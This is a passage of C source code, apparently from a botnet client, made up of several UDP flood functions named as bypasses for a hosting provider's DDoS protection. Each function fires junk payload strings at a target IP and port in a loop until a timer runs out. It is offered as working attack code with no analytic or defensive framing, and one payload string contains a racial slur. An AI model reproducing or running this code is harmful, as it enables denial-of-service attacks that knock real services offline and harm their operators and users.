AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "RyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGang",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "yfj82z4ou6nd3pig3borbrrqhcve6n56xyjzq68o7yd1axh4r0gtpgyy9fj36nc2w",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        "01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdedsecrunsyoulilassniggaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendOvhBypassOne(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {"/x50/x33/x43/x4B/x24/x54/x20/x47/x38/x33/x41/x52/x44/x20/x30/x4E/x20/x54/x30/x50/x20/x50/x38/x54/x43/x48/x20/x49/x54/x20/x42/x22/x42/x59/"};
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendOvhBypassThree(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23",
        "\x78\x6d\x69\x77\x64\x69\x6f\x20\x4d\x4f\x51\x57\x49\x22\x4b\x20\x28\x2a\x2a\x28\x44\x38\x75\x39\x32\x38\x39\x64\x32\x38\x39\x32\x65\x39\x20\x4e\x49\x4f\x57\x4a\x44\x69\x6f\x6a\x77\x69\x6f\x57\x41\x4a\x4d\x20\x44\x4b\x4c\x41\x4d\x29\x20",
        "/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57",
        };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendOvhBypassTwo(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {"/73x/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x49/x4f/x57/x20/x57/x4f/x4b/x3c/x20/x57/x44/x4b/x20/x44/x29/x5f/x41/",
        "/20x/x58/x4b/x49/x57/x44/x49/x4a/x22/x20/x22/x64/x39/x63/x39/x29/x4d/x20/x29/x57/x5f/x22/x21/x5f/x2b/x20/x51/x53/x4d/x45/x4d/x44/x4d/x20/x29/x28/x28/x22/x29/x45/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/",
        "/43x/x4f/x44/x57/x20/x49/x20/x22/x5f/x29/x20/x58/x43/x4b/x4d/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/x51/x20/x71/x5b/x7a/x71/x3b/x38/x38/x20/x43/x57/x29/x57/x22/x29/x64/x32/x20/x4b/x58/x4b/x4b/x4c/x22/x44/x20/x2d/x44/x5f/",
        };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendZgo(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
            "\\x336\\x352\\x311\\x314\\x33f\\x30f\\x346\\x33e\\x30e\\x30f\\x357\\x35d\\x35b\\x344\\x300\\x304\\x324\\x318\\x322\\x32b\\x317\\x328\\x32f\\x355\\x6c\\x338\\x31b\\x34a\\x307\\x355\\x348\\x333\\x318\\x359\\x31f\\x32c\\x356\\x355\\x359\\x66\\x337\\x31a\\x344\\x30b\\x358\\x301\\x326\\x71\\x334\\x34b\\x30f\\x30f\\x304\\x32d\\x316\\x33a\\x347\\x320\\x359\\x32a\\x35c\\x355\\x33b\\x31f\\x332\\x33b\\x77\\x336\\x306\\x344\\x312\\x342\\x313\\x353\\x355\\x31f\\x326\\x354\\x35a\\x69\\x337\\x302\\x350\\x31a\\x344\\x304\\x305\\x308\\x343\\x341\\x300\\x307\\x319\\x31f\\x33c\\x332\\x32b\\x348\\x329\\x34e\\x348\\x339\\x347\\x68\\x335\\x300\\x312\\x343\\x309\\x34a\\x35b\\x309\\x312\\x358\\x346\\x32f\\x354\\x329\\x31c\\x66\\x338\\x35b\\x353\\x348\\x319\\x316\\x322\\x328\\x33c\\x35c\\x332\\x73\\x335\\x310\\x308\\x331\\x320\\x31f\\x326\\x6c\\x336\\x34a\\x312\\x34b\\x360\\x30d\\x31c\\x33c\\x31d\\x349\\x322\\x359\\x32b\\x316\\x324\\x318\\x354\\x328\\x318\\x6b\\x337\\x31b\\x315\\x310\\x302\\x34c\\x305\\x343\\x30f\\x310\\x340\\x32a\\x316\\x31e\\x32e\\x320\\x319\\x325\\x31c\\x61\\x334\\x33e\\x331\\x333\\x353\\x33c\\x328\\x326\\x32b\\x68\\x336\\x33e\\x350\\x34b\\x342\\x32d\\x325\\x66\\x336\\x300\\x30a\\x30d\\x35d\\x344\\x31a\\x307\\x342\\x30f\\x300\\x34b\\x312\\x33e\\x306\\x352\\x32c\\x349\\x348\\x354\\x355\\x34e\\x32c\\x317\\x355\\x329\\x339\\x33c\\x66\\x334\\x315\\x34b\\x308\\x357\\x307\\x30e\\x342\\x342\\x342\\x30d\\x300\\x322\\x319\\x61\\x336\\x346\\x30a\\x33f\\x31c\\x332\\x323\\x321\\x32f\\x66\\x336\\x34c\\x309\\x303\\x346\\x303\\x33f\\x342\\x305\\x35b\\x358\\x343\\x311\\x313\\x308\\x32e\\x353\\x353\\x31d\\x316\\x345\\x64\\x337\\x30b\\x303\\x344\\x31a\\x352\\x30b\\x346\\x316\\x316\\x32c\\x347\\x318\\x356\\x322\\x332\\x31c\\x35c\\x322\\x326\\x2c\\x337\\x346\\x306\\x344\\x357\\x30a\\x341\\x314\\x344\\x31a\\x323\\x325\\x326\\x348\\x31c\\x332\\x73\\x335\\x344\\x310\\x303\\x302\\x314\\x315\\x35d\\x301\\x344\\x305\\x356\\x32c\\x32c\\x345\\x354\\x33b\\x32e\\x321\\x73\\x336\\x30e\\x30e\\x342\\x34b\\x34d\\x34d\\x32a\\x339\\x6b\\x337\\x31a\\x340\\x33e\\x307\\x304\\x31a\\x313\\x342\\x308\\x302\\x303\\x326\\x34e",
            "\\x31e\\x64\\x337\\x30b\\x33d\\x360\\x300\\x31b\\x35b\\x312\\x34a\\x351\\x309\\x308\\x30e\\x352\\x35c\\x317\\x31f\\x33a\\x73\\x336\\x309\\x308\\x33d\\x313\\x353\\x32f\\x320\\x32c\\x31f\\x61\\x334\\x314\\x319\\x325\\x33a\\x33c\\x327\\x328\\x325\\x34d\\x31c\\x31d\\x67\\x334\\x300\\x344\\x35b\\x344\\x303\\x31b\\x30e\\x305\\x341\\x35a\\x319\\x32c\\x354\\x356\\x345\\x330\\x353\\x330\\x326\\x329\\x66\\x338\\x301\\x34c\\x301\\x341\\x343\\x316\\x353\\x32d\\x65\\x338\\x30f\\x305\\x34d\\x33a\\x319\\x326\\x332\\x32c\\x33a\\x31f\\x32d\\x32e\\x339\\x32c\\x33a\\x326\\x325\\x6c\\x336\\x307\\x301\\x31a\\x360\\x35d\\x315\\x302\\x330\\x31d\\x34e\\x332\\x318\\x322\\x316\\x66\\x334\\x30a\\x35b\\x309\\x34c\\x310\\x347\\x355\\x359\\x33a\\x332\\x345\\x34d\\x31d\\x345\\x322\\x339\\x71\\x335\\x344\\x33d\\x35b\\x30d\\x30f\\x340\\x350\\x341\\x312\\x357\\x35d\\x30a\\x312\\x34b\\x352\\x32e\\x35c\\x31d\\x32c\\x339\\x326\\x321\\x355\\x317\\x33c\\x355\\x345\\x329\\x31c\\x31e\\x77\\x336\\x311\\x314\\x30f\\x350\\x309\\x35b\\x343\\x348\\x35a\\x326\\x349\\x353\\x355\\x321\\x339\\x354\\x349\\x32e\\x348\\x69\\x338\\x306\\x309\\x30c\\x35d\\x331\\x348\\x68\\x338\\x313\\x343\\x32d\\x66\\x336\\x344\\x304\\x305\\x34b\\x300\\x307\\x35d\\x353\\x31c\\x326\\x35a\\x31c\\x324\\x332\\x353\\x325\\x32a\\x347\\x32f\\x322\\x34d\\x73\\x338\\x342\\x358\\x305\\x351\\x360\\x35d\\x343\\x30b\\x35a\\x356\\x31e\\x355\\x6c\\x335\\x346\\x315\\x314\\x321\\x339\\x354\\x319\\x330\\x317\\x6b\\x337\\x300\\x30d\\x351\\x356\\x326\\x330\\x317\\x323\\x35a\\x61\\x338\\x35d\\x34c\\x344\\x352\\x30b\\x356\\x321\\x354\\x347\\x34d\\x31d\\x34d\\x32a\\x345\\x331\\x68\\x337\\x310\\x342\\x360\\x352\\x305\\x351\\x30e\\x33e\\x33d\\x35d\\x301\\x343\\x342\\x346\\x321\\x325\\x31c\\x345\\x354\\x333\\x324\\x35a\\x356\\x323\\x33c\\x339\\x31e\\x318\\x326\\x66\\x338\\x341\\x35d\\x33f\\x350\\x305\\x360\\x306\\x34c\\x300\\x314\\x30e\\x350\\x354\\x32f\\x339\\x324\\x35a\\x347\\x324\\x319\\x353\\x32b\\x327\\x31e\\x348\\x345\\x353\\x66\\x337\\x309\\x34a\\x311\\x311\\x33b\\x347\\x325\\x317\\x32a\\x318\\x61\\x336\\x30b\\x304\\x33d\\x314\\x312\\x30d\\x305\\x340\\x340\\x346\\x344\\x357\\x340\\x35d\\x358\\x355\\x321\\x321\\x32a\\x327\\x349\\x322\\x32b\\x322\\x32f\\x33a\\x66\\x334\\x30a\\x303\\x341\\x35c\\x339\\x347\\x321\\x326\\x64\\x336\\x351\\x31d\\x323\\x320\\x359\\x319\\x34d\\x33c\\x345\\x345\\x339\\x355\\x339\\x347\\x32c\\x35c\\x2c\\x338\\x305\\x352\\x313\\x35d\\x340\\x34b\\x30d\\x307\\x306\\x303\\x310\\x308\\x333\\x359\\x319\\x355\\x35a\\x339\\x32d\\x323\\x345\\x347\\x33b\\x34e\\x347\\x329\\x33a\\x73\\x336\\x305\\x306\\x33d\\x360\\x315\\x33d\\x33c\\x35a\\x333\\x73\\x336\\x310\\x357\\x312\\x31a\\x307\\x305\\x31a\\x34b\\x360\\x340\\x350\\x32b\\x6b\\x336\\x311\\x31b\\x302\\x35b\\x303\\x304\\x344\\x33d\\x301\\x34b\\x357\\x322\\x320\\x329\\x321\\x34d\\x64\\x334\\x346\\x306\\x35d\\x30d\\x35d\\x340\\x35d\\x33d\\x315\\x30b\\x31a\\x327\\x331\\x32b\\x31f\\x32a\\x73\\x334\\x34a\\x341\\x310\\x30a\\x30f\\x311\\x30a\\x34a\\x308\\x311\\x360\\x315\\x33e\\x305\\x30f\\x316\\x332\\x320\\x318\\x354\\x31f\\x345\\x326\\x317\\x327\\x353\\x353\\x326\\x317\\x32b\\x61\\x334\\x34c\\x313\\x33f\\x34b\\x352\\x33d\\x33b\\x324\\x316\\x355\\x325\\x339\\x318\\x35a\\x32c\\x67\\x336\\x304\\x33f\\x301\\x313\\x30f\\x342\\x33f\\x30e\\x300\\x341\\x300\\x358\\x309\\x352\\x344\\x34e\\x328\\x354\\x318\\x356\\x35c\\x323\\x325\\x328\\x317\\x333\\x66\\x334\\x342\\x344\\x30d\\x34c\\x35d\\x312\\x312\\x320\\x321\\x327\\x329\\x356\\x339\\x31f\\x32c\\x325\\x65\\x336\\x309\\x34c\\x313\\x360\\x30c\\x340\\x35d\\x309\\x30d\\x311\\x30c\\x355\\x330\\x347\\x355\\x348\\x34e\\x327\\x35a\\x6c\\x337\\x309\\x360\\x346\\x339\\x33b\\x33a\\x359\\x324\\x326\\x331\\x32e\\x34e\\x326\\x329\\x316\\x66\\x334\\x314\\x303\\x308\\x306\\x34b\\x314\\x352\\x303\\x314\\x30d\\x344\\x33f\\x312\\x359\\x323\\x339\\x32b\\x353\\x359\\x325\\x31f\\x356\\x331\\x33a\\x321\\x318",
            "\\x324\\x71\\x338\\x35b\\x311\\x34a\\x350\\x307\\x31b\\x307\\x33b\\x318\\x353\\x34d\\x321\\x333\\x359\\x327\\x34e\\x331\\x353\\x77\\x338\\x34a\\x31b\\x301\\x313\\x307\\x31c\\x349\\x329\\x327\\x34d\\x32e\\x31c\\x69\\x337\\x314\\x308\\x35b\\x304\\x302\\x313\\x305\\x30a\\x307\\x35d\\x30d\\x35b\\x306\\x35b\\x330\\x32d\\x31f\\x333\\x321\\x330\\x32c\\x33a\\x33b\\x324\\x355\\x68\\x337\\x315\\x346\\x33e\\x30b\\x30a\\x30f\\x307\\x35d\\x304\\x32b\\x32d\\x32e\\x326\\x355\\x66\\x337\\x300\\x350\\x34a\\x311\\x34c\\x35b\\x339\\x322\\x31e\\x324\\x31f\\x32b\\x35a\\x32b\\x73\\x335\\x30c\\x33f\\x308\\x319\\x31d\\x359\\x345\\x331\\x345\\x31f\\x322\\x339\\x6c\\x336\\x312\\x301\\x30e\\x307\\x302\\x34b\\x343\\x300\\x344\\x352\\x35d\\x312\\x360\\x354\\x32c\\x6b\\x338\\x309\\x312\\x341\\x350\\x314\\x320\\x339\\x320\\x33b\\x61\\x336\\x344\\x307\\x313\\x302\\x352\\x352\\x351\\x314\\x301\\x308\\x343\\x35a\\x345\\x316\\x329",
            "\\x30e\\x309\\x30b\\x342\\x32b\\x325\\x329\\x71\\x335\\x33f\\x339\\x329\\x31c\\x32c\\x353\\x31d\\x77\\x338\\x346\\x344\\x309\\x344\\x310\\x315\\x30a\\x307\\x357\\x30d\\x309\\x341\\x311\\x33c\\x331\\x31c\\x345\\x33a\\x31e\\x31e\\x348\\x339\\x316\\x328\\x322\\x318\\x354\\x356\\x69\\x335\\x35d\\x30a\\x344\\x30f\\x31a\\x343\\x308\\x31b\\x306\\x300\\x319\\x354\\x353\\x345\\x348\\x347\\x33c\\x339\\x319\\x35a\\x324\\x35c\\x326\\x323\\x333\\x68\\x338\\x35d\\x341\\x344\\x304\\x30d\\x341\\x360\\x352\\x34c\\x311\\x340\\x34c\\x308\\x319\\x31f\\x326\\x35c\\x32d\\x345\\x326\\x328\\x354\\x32b\\x321\\x32f\\x339\\x66\\x336\\x33f\\x315\\x311\\x35d\\x33d\\x33e\\x357\\x315\\x307\\x342\\x317\\x31d\\x31c\\x325\\x31d\\x73\\x338\\x30f\\x30b\\x303\\x340\\x33b\\x356\\x324\\x319\\x32a\\x33c\\x354\\x331\\x34d\\x33b\\x329\\x6c\\x337\\x340\\x33f\\x33d\\x341\\x300\\x35d\\x304\\x313\\x358\\x343\\x346\\x30c\\x341\\x340\\x34e\\x316\\x34d\\x321\\x347\\x333\\x355\\x6b\\x335\\x351\\x31a\\x343\\x350\\x343\\x33e\\x311\\x318\\x32e\\x325\\x31f\\x349\\x316\\x333\\x320\\x349\\x32a\\x31d\\x34e\\x31f\\x33c\\x359\\x61\\x337\\x305\\x344\\x31a\\x343\\x311\\x35d\\x346\\x303\\x344\\x320\\x322\\x33c\\x321\\x68\\x338\\x30f\\x352\\x33e\\x304\\x30c\\x356\\x66\\x337\\x30d\\x340\\x341\\x304\\x301\\x360\\x309\\x35d\\x358\\x32f\\x356\\x31c\\x66\\x334\\x342\\x35b\\x33e\\x34b\\x351\\x340\\x31a\\x35d\\x311\\x33f\\x308\\x348\\x349\\x33a\\x353\\x32c\\x347\\x318\\x318\\x326\\x345\\x354\\x32d\\x345\\x61\\x334\\x308\\x302\\x33f\\x303\\x344\\x300\\x30f\\x33d\\x305\\x323\\x317\\x35a\\x33a\\x332\\x323\\x66\\x337\\x360\\x345\\x318\\x356\\x333\\x32e\\x321\\x321\\x326\\x319\\x31c\\x316\\x359\\x64\\x338\\x35d\\x34b\\x302\\x350\\x35d\\x302\\x344\\x34c\\x307\\x348\\x356\\x327\\x359\\x319\\x35c\\x33a\\x32c\\x356\\x33b\\x32d\\x2c\\x335\\x360\\x309\\x306\\x344\\x343\\x314\\x35b\\x30d\\x333\\x32a\\x316\\x31e\\x333\\x32e\\x31f\\x330\\x73\\x338\\x30e\\x33e\\x306\\x30e\\x346\\x33f\\x35d\\x342\\x34c\\x33d\\x30a\\x308\\x310\\x35c\\x32f\\x33a\\x33a\\x317\\x32b\\x32b\\x321\\x333\\x33c\\x321\\x73\\x338\\x303\\x340\\x301\\x30e\\x312\\x300\\x342\\x303\\x34b\\x303\\x327\\x349\\x321\\x321\\x32e\\x35a\\x6b\\x334\\x306\\x311\\x34a\\x32b\\x318\\x31f\\x31f\\x33c\\x355\\x318\\x332\\x329\\x32d\\x345\\x32a\\x31c\\x328\\x64\\x338\\x344\\x350\\x30c\\x30e\\x360\\x358\\x344\\x352\\x340\\x350\\x35d\\x312\\x30c\\x33c\\x347\\x33c\\x353\\x31c\\x73\\x338\\x315\\x305\\x35d\\x34b\\x350\\x302\\x344\\x305\\x309\\x318\\x61\\x334\\x303\\x311\\x303\\x30a\\x300\\x341\\x34c\\x315\\x340\\x350\\x302\\x33f\\x30d\\x313\\x309\\x320\\x325\\x354\\x32c\\x320\\x320\\x322\\x319\\x32a\\x67\\x338\\x33f\\x33d\\x33e\\x33d\\x345\\x349\\x326\\x33a\\x349\\x324\\x333\\x33b\\x66\\x338\\x343\\x344\\x352\\x358\\x344\\x307\\x311\\x358\\x310\\x344\\x343\\x312\\x319\\x321\\x65\\x336\\x34c\\x33d\\x301\\x312\\x346\\x34c\\x357\\x305\\x302\\x319\\x32e\\x328\\x320\\x6c\\x336\\x346\\x30d\\x315\\x33e\\x344\\x310\\x35d\\x315\\x333\\x322\\x348\\x318\\x317\\x34e\\x331\\x356\\x318\\x323\\x333\\x319\\x66\\x338\\x344\\x308\\x344\\x351\\x315\\x341\\x360\\x33e\\x33d\\x301\\x33f\\x32d\\x32f\\x359\\x330\\x348\\x35c\\x339\\x71\\x336\\x306\\x344\\x341\\x343\\x35d\\x30d\\x33f\\x32a\\x327\\x34d\\x31c\\x321\\x77\\x337\\x313\\x33f\\x340\\x305\\x31b\\x309\\x301\\x315\\x358\\x344\\x306\\x34a\\x302\\x307\\x31e\\x32b\\x31c\\x324\\x345\\x348\\x359\\x349\\x327\\x32b\\x32d\\x332\\x332\\x69\\x335\\x34a\\x351\\x357\\x302\\x349\\x324\\x33a\\x34d\\x354\\x327\\x329\\x68\\x334\\x357\\x304\\x35d\\x345\\x33b\\x328\\x32f\\x324\\x66\\x334\\x34b\\x343\\x35d\\x33f\\x300\\x31a\\x344\\x30f\\x30d\\x302\\x345\\x35c\\x326\\x325\\x35a\\x324\\x333\\x328\\x73\\x338\\x351\\x35d\\x300\\x31c\\x324\\x6c\\x338\\x343\\x33d\\x358\\x312\\x315\\x341\\x343\\x303\\x342\\x351\\x357\\x30c\\x353\\x327\\x330\\x318\\x32a\\x6b\\x336\\x35d\\x300\\x32f\\x33c\\x61\\x336\\x310\\x343\\x300\\x358\\x309\\x305\\x314\\x302\\x311\\x352\\x354\\x317\\x329\\x34d\\x68\\x337\\x303\\x344\\x35d\\x343\\x302\\x360\\x331\\x345\\x34d\\x322\\x325\\x328\\x339\\x324\\x66\\x336\\x30e\\x351\\x30d\\x306\\x315\\x358\\x357\\x33e\\x358\\x314\\x301\\x312\\x314\\x33a\\x32d\\x33a\\x345\\x355\\x319\\x325\\x32f\\x328\\x359\\x32f\\x66\\x337\\x300\\x314\\x301\\x340\\x35b\\x30a\\x33d\\x350\\x306\\x34c\\x331\\x324\\x345\\x31e\\x61\\x337\\x312\\x307\\x30c\\x303\\x35d\\x312\\x30c\\x35b\\x328\\x32d\\x321\\x328\\x31c\\x356\\x31c\\x32a\\x66\\x336\\x358\\x305\\x31a\\x30f\\x35d\\x344\\x350\\x33d\\x342\\x33d\\x307\\x314\\x33e\\x307\\x343\\x321\\x32f\\x31f\\x354\\x32a\\x332\\x322\\x359\\x31c\\x355\\x345\\x327\\x31d\\x347\\x64\\x337\\x341\\x35d\\x304\\x305\\x35b\\x305\\x323\\x318\\x32f\\x320\\x324\\x330\\x353\\x34e\\x2c\\x335\\x310\\x310\\x304\\x35d\\x357\\x325\\x31e\\x31f\\x31f\\x317\\x339\\x324\\x359\\x347\\x332\\x326\\x34e\\x73\\x337\\x352\\x30f\\x302\\x32f\\x73\\x334\\x314\\x300\\x350\\x341\\x305\\x350\\x313\\x340\\x30a\\x30f\\x30f\\x360\\x305\\x302\\x30d\\x322\\x353\\x331\\x32c\\x355\\x328\\x6b\\x338\\x31a\\x33e\\x35b\\x346\\x35b\\x312\\x35d\\x314\\x30e\\x348\\x330\\x32e\\x323\\x331\\x356\\x34e\\x330\\x64\\x337\\x351\\x33d\\x33f\\x312\\x303\\x325\\x73\\x336\\x35d\\x302\\x360\\x341\\x351\\x307\\x344\\x357\\x304\\x350\\x308\\x347\\x333\\x339\\x333\\x356\\x31c\\x32f\\x31d\\x353\\x61\\x334\\x306\\x305\\x33f\\x310\\x344\\x350\\x303\\x352\\x344\\x305\\x30e\\x35c\\x35a\\x330\\x34e\\x35a\\x33b\\x328\\x319\\x345\\x329\\x328\\x33a\\x327\\x67\\x336\\x34a\\x304\\x302\\x322\\x32a\\x327\\x323\\x318\\x34d\\x32f\\x317\\x31e\\x317\\x354\\x353\\x326\\x320\\x66\\x337\\x307\\x352\\x360\\x34b\\x31a\\x30b\\x33d\\x305\\x307\\x30d\\x340\\x30f\\x311\\x34b\\x360\\x318\\x326\\x353\\x32f\\x355\\x328\\x331\\x328\\x345\\x318\\x32c\\x31d\\x65\\x334\\x312\\